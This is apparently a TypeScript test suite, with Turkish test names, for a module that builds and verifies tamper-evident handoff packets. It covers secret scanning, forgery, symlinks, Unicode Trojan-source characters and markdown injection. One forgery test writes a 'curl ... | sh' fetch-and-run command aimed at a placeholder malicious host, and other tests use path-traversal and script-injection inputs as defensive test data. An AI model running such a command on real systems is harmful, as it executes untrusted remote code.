import { test } from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { spawnSync } from "node:child_process";
import { linkSync, mkdirSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { mkTmp } from "../testing/tmp.ts";
import { PACKET_DATA, PACKET_MANIFEST, PACKET_TEXT, PacketError, createPacket, normalizePacket, openPacket, renderPacket, verifyPacket } from "./handoff-packet.ts";

const T0 = new Date("2026-10-25T12:00:00.000Z");
const FAKE_KEY = "sk-" + "Zz9Yy8Xx7Ww6Vv5Uu4Tt3Ss2";
const GOOD = { title: "Kapsül denetimi", goal: "Madde 79'u bitir.", status: "in_progress", origin: "Bulut oturumu", done: ["Kod yazıldı"], next: ["Denetim düzeltmeleri", "PR aç"], openQuestions: ["Depo hangisi?"], constraints: ["Anahtar yazma"], files: ["src/ops/capsule.ts", "docs/testing/faz11-dilim9d.md"] };
const code = (c: string) => (e: unknown) => e instanceof PacketError && e.code === c;
const sha = (b: Buffer | string) => createHash("sha256").update(b).digest("hex");

function world() {
  const base = mkTmp("devir-");
  const repo = join(base, "repo");
  const state = join(base, "state");
  const out = join(base, "devirler");
  for (const d of [repo, state, out]) mkdirSync(d);
  return { base, repo, state, out, opts: { input: GOOD as unknown, destRoot: out, repoRoot: repo, stateDir: state, now: () => T0 } };
}

// Rewrites a packet consistently (data + readable text + manifest), the way a skilled forger would.
function forge(dir: string, mutate: (d: Record<string, unknown>) => void, text?: string): void {
  const d = JSON.parse(readFileSync(join(dir, PACKET_DATA), "utf8"));
  mutate(d);
  const dBuf = Buffer.from(JSON.stringify(d, null, 2) + "\n");
  const tBuf = Buffer.from(text ?? readFileSync(join(dir, PACKET_TEXT), "utf8"));
  writeFileSync(join(dir, PACKET_DATA), dBuf);
  writeFileSync(join(dir, PACKET_TEXT), tBuf);
  writeFileSync(join(dir, PACKET_MANIFEST), JSON.stringify({ format: 1, kind: "handoff-packet-manifest", files: [{ name: PACKET_DATA, bytes: dBuf.length, sha256: sha(dBuf) }, { name: PACKET_TEXT, bytes: tBuf.length, sha256: sha(tBuf) }] }));
}

test("tam akış: yeni klasör, yalnız 3 dosya, doğrulama geçer, oku yazmaz ve metni verir", () => {
  const w = world();
  const { dir, data } = createPacket(w.opts);
  assert.ok(dir.startsWith(w.out));
  assert.deepEqual(readdirSync(dir).sort(), ["DEVIR.md", "devir.json", "manifest.json"]);
  assert.equal(data.status, "in_progress");
  const v = verifyPacket(dir);
  assert.equal(v.ok, true, v.problems.join("; "));
  const before = readdirSync(dir).map((n) => sha(readFileSync(join(dir, n))));
  const opened = openPacket(dir);
  assert.match(opened.text, /# Devir: Kapsül denetimi/);
  assert.match(opened.text, /- Denetim düzeltmeleri/);
  assert.match(opened.text, /içerik pakette YOK/);
  assert.deepEqual(readdirSync(dir).map((n) => sha(readFileSync(join(dir, n)))), before, "oku hiçbir şeyi değiştirmez");
  assert.equal(opened.text, renderPacket(opened.data));
});

test("girdi doğrulama: eksik/uzun/çok satırlı alan, bilinmeyen anahtar, geçersiz durum, yol kaçışı ve tekrar reddedilir", () => {
  const bad: Array<[string, unknown]> = [
    ["null", null], ["dizi", []], ["başlık yok", { ...GOOD, title: "" }], ["başlık uzun", { ...GOOD, title: "x".repeat(121) }],
    ["amaç satır sonu", { ...GOOD, goal: "a\n# sahte başlık" }], ["amaç kontrol karakteri", { ...GOOD, goal: "a\u0007b" }], ["amaç unicode satır ayırıcı", { ...GOOD, goal: "a\u2028b" }],
    ["bilinmeyen alan", { ...GOOD, ekstra: 1 }], ["durum", { ...GOOD, status: "bitti" }], ["liste değil", { ...GOOD, done: "x" }],
    ["çok madde", { ...GOOD, next: Array.from({ length: 31 }, () => "x") }], ["madde sayı", { ...GOOD, done: [5] }],
    ["mutlak yol", { ...GOOD, files: ["/etc/passwd"] }], ["sürücü", { ...GOOD, files: ["C:/x"] }], ["ters eğik", { ...GOOD, files: ["a\\b"] }], ["üst klasör", { ...GOOD, files: ["a/../b"] }], ["nokta", { ...GOOD, files: ["./a"] }], ["çift eğik", { ...GOOD, files: ["a//b"] }],
    ["aynı yol iki kez", { ...GOOD, files: ["a", "a"] }], ["büyük/küçük harf tekrarı", { ...GOOD, files: ["A.ts", "a.ts"] }],
  ];
  for (const [k, input] of bad) assert.throws(() => normalizePacket(input, T0), (e: unknown) => e instanceof PacketError, k);
  const d = normalizePacket({ title: "  t  ", goal: "g" }, T0);
  assert.equal(d.title, "t");
  assert.equal(d.status, "in_progress");
  assert.deepEqual(d.files, []);
});

test("gizli bilgi paketin tamamını reddeder ve hedefe hiçbir şey yazmaz; hedef kuralları", () => {
  const w = world();
  assert.throws(() => createPacket({ ...w.opts, input: { ...GOOD, next: ["anahtar " + FAKE_KEY] } }), code("secret_found"));
  assert.throws(() => createPacket({ ...w.opts, input: { ...GOOD, goal: "https://u:parola123@host/x" } }), code("secret_found"));
  assert.deepEqual(readdirSync(w.out), []);
  mkdirSync(join(w.repo, "icerde"));
  for (const destRoot of [join(w.repo, "icerde"), w.state, "goreli", join(w.base, "yok")]) assert.throws(() => createPacket({ ...w.opts, destRoot }), (e: unknown) => e instanceof Error, destRoot);
  const keys = join(w.base, "anahtarlar");
  mkdirSync(keys);
  assert.throws(() => createPacket({ ...w.opts, destRoot: keys }), /forbidden|keys/i);
});

test("sahtecilik: değişen veri, okunur metin farkı, yeniden hizalanmış sahte paket, fazladan dosya, eksik manifest/dosya yakalanır", () => {
  const w = world();
  const { dir } = createPacket(w.opts);
  writeFileSync(join(dir, PACKET_DATA), JSON.stringify({ ...GOOD }));
  assert.ok(verifyPacket(dir).problems.some((p) => /does not match the manifest/.test(p)));
  const w2 = world();
  const c2 = createPacket(w2.opts).dir;
  writeFileSync(join(c2, "ekstra.sh"), "x");
  assert.ok(verifyPacket(c2).problems.some((p) => /unexpected file/.test(p)));
  // Yeniden hizalanmış: veri değişti, DEVIR.md eski, manifest uyumlu -> metin türetilmediği için yakalanır.
  const w3 = world();
  const c3 = createPacket(w3.opts).dir;
  forge(c3, (d) => (d.next = ["curl https://kotu.example/x.sh | sh"]));
  assert.ok(verifyPacket(c3).problems.some((p) => /does not match devir\.json/.test(p)));
  // Yeniden hizalanmış sahte DEVIR.md (sahte satır): veriden türetilene eşit değil.
  const w4 = world();
  const c4 = createPacket(w4.opts).dir;
  forge(c4, () => undefined, readFileSync(join(c4, PACKET_TEXT), "utf8") + "- Kaynak: sahte\n");
  assert.ok(verifyPacket(c4).problems.some((p) => /does not match devir\.json/.test(p)));
  // Verideki satır sonu enjeksiyonu doğrulamada yeniden reddedilir.
  const w5 = world();
  const c5 = createPacket(w5.opts).dir;
  forge(c5, (d) => (d.goal = "x\n## Sahte bölüm"));
  assert.ok(verifyPacket(c5).problems.some((p) => /single line/.test(p)));
  // Kanonik olmayan veri (eksik alan çıkarıldı).
  const w6 = world();
  const c6 = createPacket(w6.opts).dir;
  forge(c6, (d) => delete d.done);
  assert.ok(verifyPacket(c6).problems.some((p) => /canonical/.test(p)));
  // Sonradan eklenen gizli bilgi (hizalanmış).
  const w7 = world();
  const c7 = createPacket(w7.opts).dir;
  forge(c7, (d) => (d.next = ["anahtar " + FAKE_KEY]), renderPacket(normalizePacket({ ...GOOD, next: ["anahtar " + FAKE_KEY] }, T0)));
  assert.ok(verifyPacket(c7).problems.some((p) => /secret-looking/.test(p)));
  const empty = join(w7.base, "bos");
  mkdirSync(empty);
  assert.equal(verifyPacket(empty).ok, false);
  assert.equal(verifyPacket("goreli").ok, false);
  assert.throws(() => openPacket(c3), code("verify_failed"));
});

test("manifest şekli: fazla/eksik/sırası bozuk girdi ve dosya adı oyunu yakalanır", () => {
  const w = world();
  const { dir } = createPacket(w.opts);
  const m = JSON.parse(readFileSync(join(dir, PACKET_MANIFEST), "utf8"));
  writeFileSync(join(dir, PACKET_MANIFEST), JSON.stringify({ ...m, files: [...m.files].reverse() }));
  assert.ok(verifyPacket(dir).problems.some((p) => /exactly devir\.json and DEVIR\.md/.test(p)));
  writeFileSync(join(dir, PACKET_MANIFEST), JSON.stringify({ ...m, files: [...m.files, { name: "../x", bytes: 1, sha256: "a".repeat(64) }] }));
  assert.ok(verifyPacket(dir).problems.length > 0);
  writeFileSync(join(dir, PACKET_MANIFEST), "{bozuk");
  assert.equal(verifyPacket(dir).ok, false);
  writeFileSync(join(dir, PACKET_MANIFEST), JSON.stringify({ format: 2 }));
  assert.equal(verifyPacket(dir).ok, false);
});

test("bağlar: DEVIR.md sembolik bağ ya da sert bağ ise (içeriği aynı olsa bile) doğrulama reddeder", (t) => {
  const w = world();
  const { dir } = createPacket(w.opts);
  const body = readFileSync(join(dir, PACKET_TEXT));
  const outside = join(w.base, "disari.md");
  writeFileSync(outside, body);
  rmSync(join(dir, PACKET_TEXT));
  try {
    symlinkSync(outside, join(dir, PACKET_TEXT));
  } catch {
    t.skip("symlinks unavailable in this environment");
    return;
  }
  assert.equal(verifyPacket(dir).ok, false, "sembolik bağlı DEVIR.md");
  rmSync(join(dir, PACKET_TEXT));
  try {
    linkSync(outside, join(dir, PACKET_TEXT));
  } catch {
    t.skip("hard links unavailable in this environment");
    return;
  }
  assert.equal(verifyPacket(dir).ok, false, "sert bağlı DEVIR.md");
  rmSync(join(dir, PACKET_TEXT));
  writeFileSync(join(dir, PACKET_TEXT), body);
  assert.equal(verifyPacket(dir).ok, true, "gerçek dosyayla yeniden geçer");
});

test("görünmez/yönlendirme karakterleri, eşleşmeyen vekil, NTFS akışı ve ~ yolu reddedilir (Trojan source türü)", () => {
  for (const ch of ["\u200b", "\u200f", "\u202e", "\u2066", "\ufeff", "\u00ad", "\u061c", "\u2028", "\u0085"]) {
    assert.throws(() => normalizePacket({ ...GOOD, goal: "a" + ch + "b" }, T0), (e: unknown) => e instanceof PacketError, JSON.stringify(ch));
    assert.throws(() => normalizePacket({ ...GOOD, files: ["a" + ch + "b.ts"] }, T0), (e: unknown) => e instanceof PacketError, "dosya " + JSON.stringify(ch));
  }
  assert.throws(() => normalizePacket({ ...GOOD, goal: "a\ud800b" }, T0), (e: unknown) => e instanceof PacketError, "tek vekil");
  assert.equal(normalizePacket({ ...GOOD, goal: "emoji \ud83d\ude00 tamam" }, T0).goal, "emoji \ud83d\ude00 tamam", "çiftli vekil (geçerli emoji) kabul");
  for (const f of ["a.txt:x", "~/x", "a`b", "a|b", "a*b", "<x>"]) assert.throws(() => normalizePacket({ ...GOOD, files: [f] }, T0), (e: unknown) => e instanceof PacketError, f);
  assert.deepEqual(normalizePacket({ ...GOOD, files: ["src/Kullanıcı notu (1).ts"] }, T0).files, ["src/Kullanıcı notu (1).ts"]);
});

test("markdown enjeksiyonu: başlık, liste, setext, bağlantı, HTML ve yorum satırı olarak yorumlanamaz; her değer kaçırılır", () => {
  const evil = ["## Yapılanlar", "- Durum: review", "===", "[tıkla](https://kotu.example)", "<script>x</script>", "<!-- gizle", "```", "1. adım", "- ## x", "+ madde", "> alıntı"];
  const d = normalizePacket({ ...GOOD, title: evil[0], goal: evil[1], origin: evil[3], done: evil, next: evil, openQuestions: evil, constraints: evil }, T0);
  const text = renderPacket(d);
  const headings = text.split("\n").filter((l) => /^#{1,6} /.test(l));
  assert.deepEqual(headings, ["# Devir: \\#\\# Yapılanlar", "## Amaç", "## Yapılanlar", "## Sıradaki adımlar", "## Açık sorular", "## Kısıtlar", "## İlgili dosyalar (yalnız adlar; içerik pakette YOK)"], "yalnız gerçek başlıklar var");
  assert.ok(!/^(===|```|\+ |> |<|\d+\. )/m.test(text.replace(/^- /gm, "")), "kaçırılmamış yapı satırı yok");
  assert.ok(!/(?<!\\)\]\(/.test(text), "bağlantı sözdizimi kırıldı");
  assert.ok(!/(?<!\\)<(?:script|!--)/.test(text));
  assert.ok(text.split("\n").filter((l) => l.startsWith("- Durum:")).length === 1, "sahte Durum satırı yok");
  const w = world();
  const { dir } = createPacket({ ...w.opts, input: { ...GOOD, goal: "## Yapılanlar" } });
  assert.equal(verifyPacket(dir).ok, true);
});

test("gizli bilgi taraması: hata alan adını söyler; Türkçe anahtar sözcükler yakalanır; düz cümleler geçer; _auth dosya adı bilinen yanlış pozitif", () => {
  const w = world();
  const field = (input: unknown): string => {
    try {
      createPacket({ ...w.opts, input });
    } catch (e) {
      return e instanceof PacketError ? e.message : "başka hata";
    }
    return "kabul";
  };
  assert.match(field({ ...GOOD, next: ["x", "parola: abc123"] }), /next\[1\]/);
  assert.match(field({ ...GOOD, goal: "şifre=abc" }), /"goal"/);
  assert.equal(field({ ...GOOD, openQuestions: ["API KEY abcd"] }), "kabul", "ayraçsız ifade gizli sayılmaz (bilinen sınır)");
  assert.match(field({ ...GOOD, title: "sk-" + "Zz9Yy8Xx7Ww6Vv5Uu4Tt3Ss2" }), /"title"/);
  assert.match(field({ ...GOOD, files: ["src/server/user_auth.ts"] }), /looks like it contains a secret/, "bilinen yanlış pozitif: _auth ile biten dosya adı reddedilir (kapsül ile aynı muhafazakâr tarama)");
  assert.equal(field({ ...GOOD, goal: "token sayısını azalt ve secret yönetimini planla" }), "kabul");
  assert.equal(readdirSync(w.out).length, 2, "yalnız kabul edilen iki paket yazıldı (ayraçsız API KEY ve düz cümle)");
});

test("limitler: sınırda kabul, bir fazlasında ret (başlık 120, amaç 2000, madde 300, kaynak 60, yol 200, liste sayıları)", () => {
  const ok = (o: Record<string, unknown>) => normalizePacket({ ...GOOD, ...o }, T0);
  const no = (o: Record<string, unknown>, k: string) => assert.throws(() => ok(o), (e: unknown) => e instanceof PacketError, k);
  ok({ title: "t".repeat(120) }); no({ title: "t".repeat(121) }, "title");
  ok({ goal: "g".repeat(2000) }); no({ goal: "g".repeat(2001) }, "goal");
  ok({ origin: "o".repeat(60) }); no({ origin: "o".repeat(61) }, "origin");
  ok({ done: ["d".repeat(300)] }); no({ done: ["d".repeat(301)] }, "item");
  no({ done: [""] }, "boş madde"); no({ done: ["   "] }, "boşluk maddesi");
  ok({ origin: "" });
  ok({ files: ["a".repeat(200)] }); no({ files: ["a".repeat(201)] }, "path");
  ok({ done: Array.from({ length: 30 }, (_, i) => "d" + i) }); no({ done: Array.from({ length: 31 }, (_, i) => "d" + i) }, "done sayısı");
  ok({ openQuestions: Array.from({ length: 20 }, (_, i) => "q" + i) }); no({ openQuestions: Array.from({ length: 21 }, (_, i) => "q" + i) }, "soru sayısı");
  ok({ constraints: Array.from({ length: 20 }, (_, i) => "c" + i) }); no({ constraints: Array.from({ length: 21 }, (_, i) => "c" + i) }, "kısıt sayısı");
  ok({ files: Array.from({ length: 100 }, (_, i) => "f" + i) }); no({ files: Array.from({ length: 101 }, (_, i) => "f" + i) }, "dosya sayısı");
});

test("manifest ve içerik: ek alan, gizli bilgi, kanonik olmayan biçim, aynı uzunlukta içerik değişimi ve yanlış bayt sayısı yakalanır", () => {
  const mk = () => createPacket(world().opts).dir;
  const rewrite = (dir: string, f: (m: any) => void, raw?: boolean) => {
    const m = JSON.parse(readFileSync(join(dir, PACKET_MANIFEST), "utf8"));
    f(m);
    writeFileSync(join(dir, PACKET_MANIFEST), raw ? JSON.stringify(m) : JSON.stringify(m, null, 2) + "\n");
  };
  const d1 = mk(); rewrite(d1, (m) => (m.note = "api_key=" + FAKE_KEY));
  assert.ok(verifyPacket(d1).problems.some((p) => /unexpected or malformed/.test(p)));
  const d2 = mk(); rewrite(d2, (m) => (m.files[0].extra = "x"));
  assert.ok(verifyPacket(d2).problems.some((p) => /unexpected or malformed/.test(p)));
  const d3 = mk(); rewrite(d3, () => undefined, true);
  assert.ok(verifyPacket(d3).problems.some((p) => /canonical/.test(p)));
  const d4 = mk(); const t = readFileSync(join(d4, PACKET_TEXT), "utf8");
  writeFileSync(join(d4, PACKET_TEXT), t.replace("Kapsül", "Kapsüi"));
  assert.ok(verifyPacket(d4).problems.some((p) => /does not match the manifest/.test(p)), "aynı uzunlukta değişiklik (sha)");
  const d5 = mk(); rewrite(d5, (m) => (m.files[1].bytes += 1));
  assert.ok(verifyPacket(d5).problems.some((p) => /does not match the manifest/.test(p)), "yanlış bayt sayısı");
  const d6 = mk(); rewrite(d6, (m) => (m.files[0].sha256 = "0".repeat(64)));
  assert.ok(verifyPacket(d6).problems.some((p) => /does not match the manifest/.test(p)), "yanlış özet");
});

test("komut satırı: --repo zorunlu; bozuk/yok girdi ve depo içi hedef tek satırlık ileti (yığın izi yok); başarılı akış", () => {
  const w = world();
  const script = join(import.meta.dirname, "..", "..", "scripts", "devir.mjs");
  const run = (...args: string[]) => spawnSync(process.execPath, ["--experimental-strip-types", "--no-warnings", script, ...args], { encoding: "utf8", cwd: w.base });
  const good = join(w.base, "girdi.json");
  writeFileSync(good, JSON.stringify(GOOD));
  const noRepo = run("olustur", good, w.out);
  assert.equal(noRepo.status, 2);
  assert.match(noRepo.stderr, /--repo/);
  assert.equal(run("olustur", good, w.out, "--repo").status, 2, "değersiz --repo");
  const bad = join(w.base, "bozuk.json");
  writeFileSync(bad, "{bozuk");
  for (const [args, re] of [[[bad, w.out], /invalid_input/], [[join(w.base, "yok.json"), w.out], /invalid_input/], [[good, join(w.repo, "icerde")], /./]] as Array<[string[], RegExp]>) {
    mkdirSync(join(w.repo, "icerde"), { recursive: true });
    const r = run("olustur", ...args, "--repo", w.repo, "--durum", w.state);
    assert.equal(r.status, 1, r.stderr);
    assert.match(r.stderr, re);
    assert.ok(!/\n\s+at /.test(r.stderr), "yığın izi basılmadı");
  }
  assert.deepEqual(readdirSync(w.repo), ["icerde"], "depoya hiçbir şey yazılmadı");
  const okRun = run("olustur", good, w.out, "--repo", w.repo, "--durum", w.state);
  assert.equal(okRun.status, 0, okRun.stderr);
  const dir = JSON.parse(okRun.stdout).dir as string;
  assert.equal(run("dogrula", dir).status, 0);
  assert.match(run("oku", dir).stdout, /# Devir: Kapsül denetimi/);
});
